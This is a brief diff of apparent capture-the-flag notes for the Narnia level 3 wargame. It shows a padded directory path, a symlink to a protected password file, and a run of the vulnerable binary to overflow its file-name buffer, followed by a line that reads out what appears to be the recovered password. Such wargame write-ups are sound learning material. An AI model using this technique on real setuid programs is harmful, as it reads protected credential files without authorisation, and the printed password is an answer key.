@@ -11,3 +11,5 @@ create folder /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3
 create symlink in this folder (ln -s /etc/narnia_pass/narnia3 /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3/o.txt)
 in narnia folder run:
 ./narnia3 /tmp/hn3/aaaaaaaaaaaaaaaaaaaaaaa/tmp/hn3/o.txt
+cat /tmp/hn3/o.txt
+thaenohtai
